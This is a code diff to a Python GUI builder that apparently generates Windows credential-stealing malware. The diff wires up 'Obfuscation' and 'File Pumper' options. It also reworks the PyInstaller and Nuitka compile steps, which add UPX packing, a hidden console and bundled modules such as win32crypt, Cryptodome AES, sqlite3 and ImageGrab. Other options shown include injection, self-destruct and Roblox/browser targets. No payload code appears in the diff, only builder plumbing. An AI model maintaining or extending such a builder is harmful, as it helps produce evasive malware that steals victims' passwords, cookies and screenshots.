@@ -180,7 +180,7 @@ class App(customtkinter.CTk):
 
         self.obfuscation = customtkinter.CTkCheckBox(
             self.builder_frame, text="Obfuscation", font=customtkinter.CTkFont(size=17, family=self.font),
-            fg_color="#5d11c3", hover_color="#5057eb")
+            fg_color="#5d11c3", hover_color="#5057eb", command=self.check_obfuscation)
         self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=240)
 
         self.injection = customtkinter.CTkCheckBox(
@@ -197,7 +197,7 @@ class App(customtkinter.CTk):
         self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=285)
 
         self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
-                                              fg_color="#5d11c3", hover_color="#5057eb", command=self.check_pumper)
+                                              fg_color="#5d11c3", hover_color="#5057eb", command=lambda: (self.check_pumper(), self.check_pump()))
         self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=285)
 
         self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
@@ -323,6 +323,14 @@ class App(customtkinter.CTk):
     def check_roblox(self):
         if self.roblox.get() == 1:
             self.browser.select()
+
+    def check_obfuscation(self):
+        if self.obfuscation.get() == 1:
+            self.pump.deselect()
+
+    def check_pump(self):
+        if self.pump.get() == 1:
+            self.obfuscation.deselect()
 
     def check_icon(self):
         if self.fileopts.get() in ["pyinstaller", "nuitka"]:
@@ -460,71 +468,80 @@ class App(customtkinter.CTk):
             else:
                 exeicon = self.iconpath
 
+            current_dir = os.path.abspath(os.getcwd())
+            script_path = os.path.join(current_dir, f"{filename}.py")
+
             if filetype == "pyinstaller":
-                subprocess.run(["./.venv/Scripts/python", "./tools/upx.py"])
-                subprocess.run(["./.venv/Scripts/python", "-m", "PyInstaller",
-                                "--onefile", "--clean", "--noconsole",
-                                "--upx-dir=./tools", "--distpath=./",
-                                "--hidden-import", "base64",
-                                "--hidden-import", "ctypes",
-                                "--hidden-import", "json",
-                                "--hidden-import", "re",
-                                "--hidden-import", "time",
-                                "--hidden-import", "typing",
-                                "--hidden-import", "subprocess",
-                                "--hidden-import", "sys",
-                                "--hidden-import", "sqlite3",
-                                "--hidden-import", "requests_toolbelt",
-                                "--hidden-import", "psutil",
-                                "--hidden-import", "PIL",
-                                "--hidden-import", "PIL.ImageGrab",
-                                "--hidden-import", "PIL.Image",
-                                "--hidden-import", "Cryptodome",
-                                "--hidden-import", "Cryptodome.Cipher",
-                                "--hidden-import", "Cryptodome.Cipher.AES",
-                                "--hidden-import", "win32crypt",
-                                "--icon", exeicon, f"./{filename}.py"]
-                               )
+                venv_dir = next((d for d in os.listdir(current_dir) if d.startswith('.venv')), None)
+                if venv_dir:
+                    venv_python = os.path.join(current_dir, venv_dir, "Scripts", "python")
+                    subprocess.run([venv_python, os.path.join(current_dir, "tools", "upx.py")])
+                    subprocess.run([venv_python, "-m", "PyInstaller",
+                                    "--onefile", "--clean", "--noconsole",
+                                    "--upx-dir=./tools", "--distpath=./",
+                                    "--hidden-import", "base64",
+                                    "--hidden-import", "ctypes",
+                                    "--hidden-import", "json",
+                                    "--hidden-import", "re",
+                                    "--hidden-import", "time",
+                                    "--hidden-import", "typing",
+                                    "--hidden-import", "subprocess",
+                                    "--hidden-import", "sys",
+                                    "--hidden-import", "sqlite3",
+                                    "--hidden-import", "requests_toolbelt",
+                                    "--hidden-import", "psutil",
+                                    "--hidden-import", "PIL",
+                                    "--hidden-import", "PIL.ImageGrab",
+                                    "--hidden-import", "PIL.Image",
+                                    "--hidden-import", "Cryptodome",
+                                    "--hidden-import", "Cryptodome.Cipher",
+                                    "--hidden-import", "Cryptodome.Cipher.AES",
+                                    "--hidden-import", "win32crypt",
+                                    "--icon", exeicon, script_path])
+                    logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
+                else:
+                    logging.error("Virtual environment directory not found. Aborting PyInstaller.")
 
-                logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
-
-            if filetype == "nuitka":
+            elif filetype == "nuitka":
                 if sys.version_info[:2] > (3, 11):
                     print("Nuitka does not support Python 3.12")
                     logging.error("Nuitka does not support Python 3.12")
                     return
                 else:
-                    try:
-                        if exeicon != "NONE":
-                            # If exeicon is not None, set the icon parameter
-                            subprocess.run([
-                                "./.venv/Scripts/python", "-m", "nuitka",
-                                "--onefile", "--standalone", "--remove-output",
-                                "--show-progress", "--prefer-source-code",
-                                "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
-                                "--include-module=sqlite3", "--include-module=psutil",
-                                "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
-                                "--assume-yes-for-downloads", "--windows-disable-console",
-                                f"--windows-icon-from-ico={exeicon}",
-                                f"./{filename}.py"
-                            ])
-                        else:
-                            # If exeicon is None, run without setting the icon parameter
-                            subprocess.run([
-                                "./.venv/Scripts/python", "-m", "nuitka",
-                                "--onefile", "--standalone", "--remove-output",
-                                "--show-progress", "--prefer-source-code",
-                                "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
-                                "--include-module=sqlite3", "--include-module=psutil",
-                                "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
-                                "--assume-yes-for-downloads", "--windows-disable-console",
-                                f"./{filename}.py"
-                            ])
-                        logging.info(f"Successfully compiled {filename}.exe with nuitka")
-                    except Exception as e:
-                        logging.error(f"Error with compiling file: {e}")
+                    venv_dir = next((d for d in os.listdir(current_dir) if d.startswith('.venv')), None)
+                    if venv_dir:
+                        venv_python = os.path.join(current_dir, venv_dir, "Scripts", "python")
+                        try:
+                            if exeicon != "NONE":
+                                subprocess.run([
+                                    venv_python, "-m", "nuitka",
+                                    "--onefile", "--standalone", "--remove-output",
+                                    "--show-progress", "--prefer-source-code",
+                                    "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
+                                    "--include-module=sqlite3", "--include-module=psutil",
+                                    "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
+                                    "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                    "--assume-yes-for-downloads", "--windows-disable-console",
+                                    f"--windows-icon-from-ico={exeicon}",
+                                    f"./{filename}.py"
+                                ])
+                            else:
+                                subprocess.run([
+                                    venv_python, "-m", "nuitka",
+                                    "--onefile", "--standalone", "--remove-output",
+                                    "--show-progress", "--prefer-source-code",
+                                    "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
+                                    "--include-module=sqlite3", "--include-module=psutil",
+                                    "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
+                                    "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                    "--assume-yes-for-downloads", "--windows-disable-console",
+                                    f"./{filename}.py"
+                                ])
+                            logging.info(f"Successfully compiled {filename}.exe with nuitka")
+                        except Exception as e:
+                            logging.error(f"Error with compiling file: {e}")
+                    else:
+                        logging.error("Virtual environment directory not found. Aborting Nuitka.")
 
         except Exception as e:
             logging.error(f"Error with compiling file: {e}")
